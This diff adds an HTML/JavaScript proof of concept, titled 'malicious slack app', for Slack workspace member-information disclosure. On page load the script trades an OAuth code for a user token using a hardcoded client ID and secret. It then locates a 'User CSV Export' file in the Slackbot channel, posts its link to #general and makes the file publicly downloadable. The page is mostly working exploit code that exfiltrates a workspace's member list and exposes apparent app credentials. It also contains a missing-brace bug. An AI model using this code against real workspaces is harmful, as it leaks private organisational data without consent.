@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+<title>malicious slack app</title>
+<!-- Latest compiled and minified CSS -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+<!-- Optional theme -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
+<!-- Latest compiled and minified JavaScript -->
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+</head>
+<body onload="getObject()">
+<div class="container pt-3">
+	<h1>Slack Workspace Members Info disclosure PoC</h1>
+	<button onclick="get_conv_id();" class="btn-info">Extract File</button><br /><br />
+	<code id="result"></code>
+</div>
+</body>
+<script>
+
+var client_id = "966666282881.1108072919398";
+var client_secret  = "4ec9835b936bfc502a56db662bf8fbbc";
+
+var code = document.location.href.split("?")[1].split("&")[0].split('=')[1];
+var data = "code="+code+"&client_id="+client_id+"&client_secret="+client_secret;
+
+var get_conv_id = () => {
+	document.getElementById("result").innerHTML = "<br />[+] Fetching Slackbot channel name<br />"
+	var channel = "";
+	var token = localStorage.getItem("token")
+	fetch("https://slack.com/api/conversations.list?types=im%2Cmpim&token="+token).then(
+		response => response.json()).then((json) => {
+		 for(var i = 0; i < json["channels"].length; i++){
+			if(json["channels"][i]["user"] == "USLACKBOT")
+			 	channel = json["channels"][i]["id"];
+		 }
+		get_file_url(channel);
+	})
+
+}
+
+var get_file_url = (channel) => {
+	fetch("https://slack.com/api/conversations.history?channel="+channel+"&token="+localStorage.getItem("token")).then(
+		resp => resp.json()).then((json) => { 
+			if(json["messages"][0]["files"][0]["title"] == "User CSV Export")
+				var permalink = json["messages"][0]["files"][0]["permalink"]
+				var url_private_download = json["messages"][0]["files"][0]["url_private_download"]
+				var public_link = json["messages"][0]["files"][0]["permalink_public"]
+				var pub_secret = public_link.split("-").reverse()[0]
+				localStorage.setItem("permalink", permalink)
+				localStorage.setItem("public_link", url_private_download+"?pub_secret="+pub_secret)
+				localStorage.setItem("fileid", permalink.split("/")[5])
+				document.getElementById("result").innerHTML += "[+] Fetching file URL..<br />"
+				post_message();
+		})
+}
+
+var make_file_public = () => {
+	document.getElementById("result").innerHTML += "[+] Creating Public URL..<br />"
+	fetch("https://slack.com/api/files.sharedPublicURL?file="+localStorage.getItem("fileid")+"&token="+localStorage.getItem("token")).then(
+		resp => resp.json()).then((json) => {
+			document.getElementById("result").innerHTML += "[+] Success! Download the complete members list: <a href=\""+localStorage.getItem("public_link")+"\">Download Here</a>";
+		})
+	
+}
+
+
+var post_message = () => {
+	fetch("https://slack.com/api/chat.postMessage?channel=%23general&blocks=%5B%7B%22type%22%3A%22rich_text%22%2C%22elements%22%3A%5B%7B%22type%22%3A%22rich_text_section%22%2C%22elements%22%3A%5B%7B%22type%22%3A%22link%22%2C%22url%22%3A%22"+localStorage.getItem("permalink")+"%22%7D%5D%7D%5D%7D%5D&token="+localStorage.getItem("token")).then(
+		resp => resp.json()).then((json) => {
+			console.log(json)
+			setTimeout(make_file_public, 6000);
+		});	
+
+}
+
+function getObject(){
+    		fetch("https://slack.com/api/oauth.v2.access",{method: "POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: data}).then(
+        		response => response.json()
+    		).then((json) => {
+        		console.log(json);
+        		localStorage.setItem("token", json["authed_user"]["access_token"])
+		});
+
+}
+
+
+</script>
+</html>
